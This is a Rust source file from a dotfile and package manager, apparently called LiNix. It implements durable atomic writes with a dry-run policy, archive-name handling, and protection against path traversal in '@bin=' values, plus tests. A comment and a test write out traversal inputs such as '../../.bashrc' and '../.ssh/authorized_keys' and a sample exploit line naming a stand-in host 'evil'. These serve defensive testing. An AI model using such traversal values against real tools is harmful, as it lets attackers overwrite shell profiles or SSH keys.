use crate::core::{Error, Result};
use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use tempfile::NamedTempFile;

/// Write a file LiNix owns — `active`, `preferences.toml`, a manifest, a lock under `locks/`,
/// the WAL, its own state registry — atomically, and **the one place `--dry-run` stops bytes
/// from reaching a disk**.
///
/// Returns `true` when the bytes were written and `false` when the run is a preview, so a
/// caller can phrase its own message either way without asking the flag a second time.
///
/// It says what it would have done, at a level the default filter shows: the five verbs this
/// exists for did not merely act during a preview, they acted *silently*, and of the two that
/// is the worse half — `--dry-run activate Work` switched the profile and printed nothing at
/// all.
///
/// **There were two of these.** A preview-aware `write_config` and a permissive `atomic_write`,
/// and the second is the one the `save()` methods reached for: `--dry-run adopt` recorded 112
/// packages as managed while the manifest that declares them was correctly not written, leaving
/// the machine in the one state the model reads as *the user deleted every line*. A writer that
/// honours the flag is no protection while a writer that ignores it sits beside it, so there is
/// now one **preview policy for the config repo**.
///
/// **That sentence used to say "so there is now one", full stop, and it was wrong about the
/// thing it sounded like it was claiming.** There are two preview policies and there always
/// were: this one, which prints *would write …* and stops, and the executor's, which diverts the
/// bytes into a dry-run VFS so a later read in the same run sees them. Both are correct and they
/// answer different questions — a manifest a preview must not touch, versus a file the previewed
/// commands would go on to read. What was *not* correct is that each carried its own copy of the
/// rename-into-place dance, and two of the three copies had no `fsync` in them. The durability
/// is one function now ([`durable_write`]); the preview policies remain two, deliberately, and
/// `a_writer_that_reaches_the_disk_goes_through_one_tests` enumerates them.
pub fn persist(path: &Path, content: &str) -> Result<bool> {
    if crate::core::dry_run::active() {
        crate::would_warn!("would write {}", path.display());
        return Ok(false);
    }
    atomic_write(path, content)?;
    Ok(true)
}

/// Add one line to the end of a file, durably. Returns whether the bytes reached the disk.
///
/// For append-only logs, where rewriting the whole file to record one more event is O(n²) in
/// the number of events. Same preview policy as [`persist`]: a run that performs nothing writes
/// nothing.
///
/// A crash partway through leaves a truncated final line rather than a corrupt file, which is
/// the property that makes the format worth having — the reader drops an unparseable tail and
/// keeps everything before it.
pub fn append_line(path: &Path, line: &str) -> Result<bool> {
    if crate::core::dry_run::active() {
        crate::would_warn!("would append to {}", path.display());
        return Ok(false);
    }
    if let Some(dir) = path.parent() {
        if !dir.exists() {
            fs::create_dir_all(dir).map_err(Error::from)?;
        }
    }
    let mut file = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .map_err(Error::from)?;
    file.write_all(line.as_bytes()).map_err(Error::from)?;
    file.write_all(b"\n").map_err(Error::from)?;
    file.sync_data().map_err(Error::from)?;
    Ok(true)
}

/// The bytes, atomically, with no policy. **Private on purpose** — [`persist`] is the way in,
/// so a new writer cannot reach the disk during a preview by picking the shorter name.
fn atomic_write(path: &Path, content: &str) -> Result<()> {
    durable_write(path, content, |_| Ok(()))
}

/// **The one durable write.** Bytes into a temporary file beside the destination, flushed,
/// `prepare`d, fsynced, then renamed over the target.
///
/// **Every step is load-bearing and three of them were missing from two of the three callers.**
/// `rename` is atomic against a concurrent *reader* — nobody ever sees a half-written file — and
/// says nothing at all about power loss: a rename can reach the disk before the bytes it points
/// at do, which leaves a file of the right name and zero length. `CommandExecutor::write_atomic`
/// omitted both `flush` and `sync_all` and is what writes a systemd unit and a `link:` target,
/// while `registry.json` and the WAL went through here and survived. That is the worst possible
/// division: a crash keeps LiNix's record of what it did and loses what it did.
///
/// `prepare` runs on the temporary file **after** the bytes and **before** the rename, which is
/// the only window in which a mode change is not a window. A `chmod` after the rename means the
/// target path holds world-readable plaintext for however long that takes, and for a secret
/// "however short" is not an argument (T5).
///
/// `pub(crate)` rather than private because the executor's two writers are the other legitimate
/// front door — they answer to the dry-run VFS instead of to [`persist`]'s preview check — and a
/// second copy of this dance is exactly what they were.
pub(crate) fn durable_write(
    path: &Path,
    content: &str,
    prepare: impl FnOnce(&Path) -> Result<()>,
) -> Result<()> {
    let dir = path.parent().ok_or_else(|| {
        let err = std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            "Target path has no parent directory",
        );
        Error::Io(err.to_string())
    })?;

    if !dir.exists() {
        fs::create_dir_all(dir).map_err(Error::from)?;
    }

    let mut temp_file = NamedTempFile::new_in(dir).map_err(Error::from)?;
    temp_file
        .write_all(content.as_bytes())
        .map_err(Error::from)?;
    temp_file.flush().map_err(Error::from)?;
    prepare(temp_file.path())?;
    temp_file.as_file().sync_all().map_err(Error::from)?;
    temp_file.persist(path).map_err(Error::from)?;

    Ok(())
}

pub fn ensure_dir(path: &Path) -> Result<()> {
    if !path.exists() {
        fs::create_dir_all(path).map_err(Error::from)?;
    }
    Ok(())
}

pub fn read_lines_filtered(path: &Path) -> Result<Vec<String>> {
    if !path.exists() {
        return Ok(vec![]);
    }

    let content = fs::read_to_string(path).map_err(Error::from)?;
    Ok(content
        .lines()
        .map(|line| line.trim())
        .filter(|line| !line.is_empty() && !line.starts_with('#'))
        .map(|line| line.to_string())
        .collect())
}

pub fn force_remove(path: &Path) -> Result<()> {
    if path.exists() {
        if path.is_dir() {
            fs::remove_dir_all(path).map_err(Error::from)?;
        } else {
            fs::remove_file(path).map_err(Error::from)?;
        }
    }
    Ok(())
}

/// The path inside `bin_dir` that an `@bin=` value names, refused if it names anywhere else
/// (SEC1).
///
/// `@bin=` is user text, and text a user pastes from somewhere else. Joined blindly,
/// `@bin=../../.bashrc` resolves to a file in the home directory, and the deploy that follows
/// replaces it with a symlink to a freshly downloaded, attacker-chosen file — one pasted line,
/// code on the next shell start. **The traversal is in the destination, so HTTPS and a matching
/// checksum do not touch it**: a fully verified download lands wherever `@bin` points.
///
/// A bin name is a filename. Anything with a separator in it, anywhere, is refused rather than
/// normalised, because "what does `a/../b` mean" is a question with a different answer on every
/// filesystem and none of them is worth being wrong about.
///
/// `confined` is the `[guard] confine_bin` key: off restores the unchecked join. The opening is
/// the user's to make, and it is the whole file's worth of blast radius.
/// Every suffix that comes off a downloaded file's name.
///
/// **The archive half is `Format`'s own table**, not a fourth hand-written copy of it — this
/// list carried `.tar.zst` for as long as `extract_archive` could not open one, which is how
/// four lists of one fact stay wrong in four different ways. What is spelled out here is only
/// what `Format` does not know about: the bare codec tails, which name a compressed file rather
/// than an artifact LiNix would ever select, and `.7z`, which nothing opens and everything
/// should still strip.
///
/// **Sorted longest-first, rather than written that way.** The lookup below takes the first
/// match, so `.gz` sitting above `.tar.gz` would silently cut `ripgrep.tar.gz` down to
/// `ripgrep.tar`. That was a hand-maintained ordering with a comment asking future editors to
/// preserve it; it is a property of the list now.
static ARCHIVE_SUFFIXES: once_cell::sync::Lazy<Vec<&'static str>> =
    once_cell::sync::Lazy::new(|| {
        use crate::backends::artifact::format::Format;
        let mut all: Vec<&'static str> = Format::ALL
            .into_iter()
            .filter(|f| f.is_archive())
            .flat_map(|f| f.suffixes().iter().copied())
            .chain([".gz", ".bz2", ".xz", ".zst", ".7z", ".exe", ".appimage"])
            .collect();
        all.sort_by_key(|s| std::cmp::Reverse(s.len()));
        all
    });

/// The name a downloaded file installs under.
///
/// Only known suffixes come off, and repeatedly: cutting at the first `.` turned
/// `ripgrep-14.1.0-x86_64.tar.gz` into `ripgrep-14`, and that misnamed binary is what
/// landed on PATH.
pub fn strip_archive_suffixes(filename: &str) -> &str {
    let mut name = filename;
    loop {
        let lower = name.to_ascii_lowercase();
        match ARCHIVE_SUFFIXES.iter().find(|s| lower.ends_with(*s)) {
            Some(suffix) => name = &name[..name.len() - suffix.len()],
            None => return name,
        }
    }
}

pub fn bin_destination(bin_dir: &Path, name: &str, confined: bool) -> Result<PathBuf> {
    let refuse = |why: &str| {
        Err(Error::Validation(format!(
            "refusing `@bin={}`: {}. It names a file inside {}, and nothing else — a value \
             that escapes it would put a downloaded file wherever it pointed. Set \
             `[guard] confine_bin = false` if you really mean it.",
            name,
            why,
            bin_dir.display()
        )))
    };
    if confined {
        if name.is_empty() {
            return refuse("it is empty");
        }
        if name.contains('/') || name.contains('\\') {
            return refuse("it contains a path separator");
        }
        if name == "." || name == ".." {
            return refuse("it is a directory, not a name");
        }
        if Path::new(name).is_absolute() {
            return refuse("it is an absolute path");
        }
    }

    #[cfg_attr(not(windows), allow(unused_mut))]
    let mut dest = bin_dir.join(name);
    // The recorded path has to be the one that was written, extension and all, or the removal
    // path looks for a file that was never there.
    #[cfg(windows)]
    if dest.extension().is_none() {
        dest.set_extension("exe");
    }
    Ok(dest)
}

/// Put a downloaded artifact's executable on the user's PATH, refusing to destroy a file
/// LiNix did not deploy.
///
/// `dest` must come from [`bin_destination`], which is what keeps an `@bin=` value from
/// naming a file outside the bin directory (SEC1).
///
/// `~/.local/bin` is shared with the user and with every other tool that installs there, so
/// deploying by name alone means a package called `fd` silently replaces whatever `fd` the
/// user already had. `ShimManager` has always refused that; the download backends each
/// hand-rolled a symlink that did not, so the same directory had opposite answers depending on
/// which backend got there first.
///
/// A destination counts as LiNix's when it is absent, when it is a symlink pointing inside
/// `owned_root` (the backend's own install directory), or when it is the exact path this
/// backend recorded deploying last time — which is what identifies a copy, since a copy
/// carries no pointer home.
pub async fn deploy_executable(
    src: &Path,
    dest: &Path,
    owned_root: &Path,
    recorded: Option<&str>,
) -> Result<()> {
    ensure_deployable(dest, owned_root, recorded).await?;

    if let Some(parent) = dest.parent() {
        tokio::fs::create_dir_all(parent)
            .await
            .map_err(Error::from)?;
    }
    // The old entry must be gone before the new one is made: symlink and copy both fail onto
    // an existing path, and a dangling symlink reports as absent to `try_exists`.
    if tokio::fs::symlink_metadata(dest).await.is_ok() {
        tokio::fs::remove_file(dest).await.map_err(Error::from)?;
    }

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let meta = tokio::fs::metadata(src).await.map_err(Error::from)?;
        let mut perms = meta.permissions();
        perms.set_mode(0o755);
        tokio::fs::set_permissions(src, perms)
            .await
            .map_err(Error::from)?;
        tokio::fs::symlink(src, dest).await.map_err(Error::from)?;
    }

    #[cfg(windows)]
    {
        // No symlink: it needs a privilege the user may not have, and the copy is what the
        // Windows backends already did.
        tokio::fs::copy(src, dest).await.map_err(Error::from)?;
    }

    Ok(())
}

/// The whole of [`deploy_executable`]'s refusal, asked without any bytes.
///
/// The test is a pure function of the *destination*, so a backend can ask it before it spends
/// the network — and must. Asking only at deploy time cost one `heal` 180 of its 201 seconds
/// fetching two GitHub artifacts it was always going to reject, silently, with no child process
/// to show for it: from outside, indistinguishable from a hang.
pub async fn ensure_deployable(
    dest: &Path,
    owned_root: &Path,
    recorded: Option<&str>,
) -> Result<()> {
    if is_ours(dest, owned_root, recorded).await {
        return Ok(());
    }
    Err(Error::Refused(format!(
        "refusing to deploy `{}`: {} already exists and LiNix did not create it. Move or \
         rename that file yourself if you want it managed here.",
        dest.file_name().unwrap_or_default().to_string_lossy(),
        dest.display()
    )))
}

async fn is_ours(dest: &Path, owned_root: &Path, recorded: Option<&str>) -> bool {
    let Ok(meta) = tokio::fs::symlink_metadata(dest).await else {
        return true; // absent
    };
    if recorded.is_some_and(|r| Path::new(r) == dest) {
        return true;
    }
    if meta.file_type().is_symlink() {
        if let Ok(target) = tokio::fs::read_link(dest).await {
            return target.starts_with(owned_root);
        }
    }
    false
}

/// Delete a file or directory a backend deployed, reporting whether it is actually gone.
///
/// An already-absent path counts as removed: the caller's goal is "not on disk", and
/// `NotFound` means that goal is met. Any other error means the file is still there and
/// still on the user's PATH, which the caller must not record as a clean removal.
pub async fn remove_deployed_path(path: impl AsRef<Path>) -> std::result::Result<(), String> {
    let path = path.as_ref();
    let meta = match tokio::fs::symlink_metadata(path).await {
        Ok(m) => m,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        Err(e) => return Err(format!("{}: {}", path.display(), e)),
    };
    let outcome = if meta.is_dir() {
        tokio::fs::remove_dir_all(path).await
    } else {
        tokio::fs::remove_file(path).await
    };
    match outcome {
        Ok(()) => Ok(()),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(()),
        Err(e) => Err(format!("{}: {}", path.display(), e)),
    }
}

#[cfg(test)]
mod bin_destination_tests {
    use super::*;

    fn dir() -> PathBuf {
        PathBuf::from("/home/u/.local/bin")
    }

    #[test]
    fn a_traversing_bin_name_is_refused() {
        // SEC1's exploit, one pasted line: `web:http://evil/x @bin=../../.bashrc` resolved to
        // the home directory and the deploy replaced the shell profile with a symlink to the
        // downloaded file. HTTPS and a matching checksum do not touch this — the traversal is
        // in the destination.
        for bad in [
            "../../.bashrc",
            "../.ssh/authorized_keys",
            r"..\..\x",
            "sub/dir",
            "..",
            "",
        ] {
            assert!(
                bin_destination(&dir(), bad, true).is_err(),
                "`{}` must be refused",
                bad
            );
        }
    }

    #[test]
    fn a_plain_name_lands_in_the_bin_directory() {
        let out = bin_destination(&dir(), "fd", true).unwrap();
        assert_eq!(out.parent().unwrap(), dir());
        assert!(out.file_name().unwrap().to_string_lossy().starts_with("fd"));
    }

    #[test]
    fn the_guard_key_is_what_opens_it() {
        // `[guard] confine_bin = false` restores the unchecked join. The opening is the
        // user's to make, and this asserts it is still there to make.
        assert!(bin_destination(&dir(), "../../.bashrc", false).is_ok());
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    /// An artifact directory with one executable in it, and the bin dir it deploys into.
    async fn fixture() -> (TempDir, std::path::PathBuf, std::path::PathBuf) {
        let dir = TempDir::new().unwrap();
        let owned = dir.path().join("artifacts");
        let bin = dir.path().join("bin");
        tokio::fs::create_dir_all(&owned).await.unwrap();
        tokio::fs::create_dir_all(&bin).await.unwrap();
        let src = owned.join("fd");
        tokio::fs::write(&src, b"#!/bin/sh\ntrue\n").await.unwrap();
        (dir, src, bin)
    }

    #[tokio::test]
    async fn it_deploys_into_an_empty_bin_dir() {
        let (_d, src, bin) = fixture().await;
        let dest = bin.join("fd");
        deploy_executable(&src, &dest, src.parent().unwrap(), None)
            .await
            .unwrap();
        assert!(tokio::fs::symlink_metadata(&dest).await.is_ok());
    }

    #[tokio::test]
    async fn it_refuses_to_replace_a_file_linix_did_not_deploy() {
        // `~/.local/bin` is shared with the user. Deploying by name alone would make a
        // package called `fd` silently destroy whatever `fd` they already had.
        let (_d, src, bin) = fixture().await;
        let dest = bin.join("fd");
        tokio::fs::write(&dest, b"the user's own fd").await.unwrap();

        let err = deploy_executable(&src, &dest, src.parent().unwrap(), None)
            .await
            .unwrap_err();
        assert!(format!("{}", err).contains("did not create it"), "{}", err);
        // And it is still theirs.
        assert_eq!(
            tokio::fs::read(&dest).await.unwrap(),
            b"the user's own fd".to_vec()
        );
    }

    #[tokio::test]
    async fn it_replaces_the_path_this_backend_recorded_last_time() {
        // The upgrade case: same declaration, new version. A copy carries no pointer home,
        // so the recorded path is what identifies it as ours.
        let (_d, src, bin) = fixture().await;
        let dest = bin.join("fd");
        tokio::fs::write(&dest, b"an older deploy").await.unwrap();

        let recorded = dest.to_string_lossy().to_string();
        deploy_executable(&src, &dest, src.parent().unwrap(), Some(&recorded))
            .await
            .unwrap();
        assert_ne!(
            tokio::fs::read(&dest).await.unwrap_or_default(),
            b"an older deploy".to_vec()
        );
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn it_replaces_a_symlink_that_points_into_its_own_artifacts() {
        let (_d, src, bin) = fixture().await;
        let old = src.parent().unwrap().join("fd-old");
        tokio::fs::write(&old, b"old").await.unwrap();
        let dest = bin.join("fd");
        tokio::fs::symlink(&old, &dest).await.unwrap();

        deploy_executable(&src, &dest, src.parent().unwrap(), None)
            .await
            .unwrap();
        assert_eq!(tokio::fs::read_link(&dest).await.unwrap(), src);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn it_refuses_a_symlink_that_points_somewhere_else() {
        // Another tool's symlink is not ours to replace, even though it is a symlink.
        let (_d, src, bin) = fixture().await;
        let elsewhere = bin.join("some-other-tool");
        tokio::fs::write(&elsewhere, b"x").await.unwrap();
        let dest = bin.join("fd");
        tokio::fs::symlink(&elsewhere, &dest).await.unwrap();

        assert!(deploy_executable(&src, &dest, src.parent().unwrap(), None)
            .await
            .is_err());
    }
}

#[cfg(test)]
mod suffix_tests {
    use super::strip_archive_suffixes;

    #[test]
    fn a_dotted_version_is_not_mistaken_for_an_extension() {
        // Cutting at the first `.` named the installed binary `ripgrep-14`.
        assert_eq!(
            strip_archive_suffixes("ripgrep-14.1.0-x86_64.tar.gz"),
            "ripgrep-14.1.0-x86_64"
        );
        assert_eq!(
            strip_archive_suffixes("fd-v10.2.0-x86_64-unknown-linux-gnu.tar.gz"),
            "fd-v10.2.0-x86_64-unknown-linux-gnu"
        );
    }

    #[test]
    fn a_bare_name_is_left_alone() {
        assert_eq!(strip_archive_suffixes("jq"), "jq");
        assert_eq!(strip_archive_suffixes("socket.io"), "socket.io");
    }

    #[test]
    fn the_suffix_match_is_case_insensitive_and_repeats() {
        assert_eq!(strip_archive_suffixes("Tool-1.0.ZIP"), "Tool-1.0");
        assert_eq!(strip_archive_suffixes("tool.tar.gz"), "tool");
    }
}

/// Copy `from` over `to`, whatever `to` currently is, and name the path if it cannot.
///
/// Two things `tokio::fs::copy` alone does not do. It cannot open a read-only destination for
/// writing — and a restored config root is full of them, because `bundle` copies the whole
/// root, that root is a git repo, and git writes its objects at 0444 which `copy` carries
/// across. Removing the destination first is what makes an overwrite an overwrite. (Running as
/// root hides this entirely, which is why every container run was green.)
///
/// And its error is `Permission denied (os error 13)` with no path in it, on one of several
/// hundred copies. An I/O error that names no file is one nobody can act on.
pub async fn copy_over(from: &Path, to: &Path) -> Result<()> {
    // Only an existing FILE is removed: a directory in the way is a different fault, and
    // deleting one to make room for a file would turn a mistake into data loss.
    if tokio::fs::symlink_metadata(to)
        .await
        .map(|m| !m.is_dir())
        .unwrap_or(false)
    {
        tokio::fs::remove_file(to)
            .await
            .map_err(|e| Error::Io(format!("could not replace {}: {}", to.display(), e)))?;
    }
    tokio::fs::copy(from, to).await.map_err(|e| {
        Error::Io(format!(
            "could not copy {} to {}: {}",
            from.display(),
            to.display(),
            e
        ))
    })?;
    Ok(())
}
